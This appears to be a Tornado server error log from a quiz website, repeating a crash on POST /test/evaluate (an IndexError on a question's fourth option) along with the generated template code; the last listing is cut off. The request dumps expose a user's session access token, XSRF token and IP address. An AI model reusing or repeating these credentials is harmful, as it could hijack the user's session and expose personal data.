HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059d6168e4c85480ff4f8be&answers=%5B0%5D&cursor=0&_xsrf=52aa03f9a0d54ce49644546759814ff9', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '2.27.103.153', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFMM2t2SkRQU1FGODFldlg4djBFdGJEQURwTFNDMkVZOWROYjh6NEwyNE50blpDNHZvWkE0Q08xYTFvZGt0T1RVb1RsejFaQktHVWxaQ3JvYndFZzhnQkR0VTBZVGdaRFpE|1348064677|fd457ce5b9b5a84c7771deab9c635d3e0edf9eae; _xsrf=52aa03f9a0d54ce49644546759814ff9; __utma=188782963.1417250236.1348064643.1348064643.1348064643.1; __utmb=188782963.5.10.1348064643; __utmc=188782963; __utmz=188782963.1348064643.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 113.00ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059d6168e4c85480ff4f8be&answers=%5B3%5D&cursor=13&_xsrf=52aa03f9a0d54ce49644546759814ff9', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '2.27.103.153', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFMM2t2SkRQU1FGODFldlg4djBFdGJEQURwTFNDMkVZOWROYjh6NEwyNE50blpDNHZvWkE0Q08xYTFvZGt0T1RVb1RsejFaQktHVWxaQ3JvYndFZzhnQkR0VTBZVGdaRFpE|1348064677|fd457ce5b9b5a84c7771deab9c635d3e0edf9eae; _xsrf=52aa03f9a0d54ce49644546759814ff9; __utma=188782963.1417250236.1348064643.1348064643.1348064643.1; __utmb=188782963.5.10.1348064643; __utmc=188782963; __utmz=188782963.1348064643.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 112.95ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059d6168e4c85480ff4f8be&answers=%5B0%2C3%5D&cursor=17&_xsrf=52aa03f9a0d54ce49644546759814ff9', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '97', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '2.27.103.153', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFMM2t2SkRQU1FGODFldlg4djBFdGJEQURwTFNDMkVZOWROYjh6NEwyNE50blpDNHZvWkE0Q08xYTFvZGt0T1RVb1RsejFaQktHVWxaQ3JvYndFZzhnQkR0VTBZVGdaRFpE|1348064677|fd457ce5b9b5a84c7771deab9c635d3e0edf9eae; _xsrf=52aa03f9a0d54ce49644546759814ff9; __utma=188782963.1417250236.1348064643.1348064643.1348064643.1; __utmb=188782963.5.10.1348064643; __utmc=188782963; __utmz=188782963.1348064643.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 72.65ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
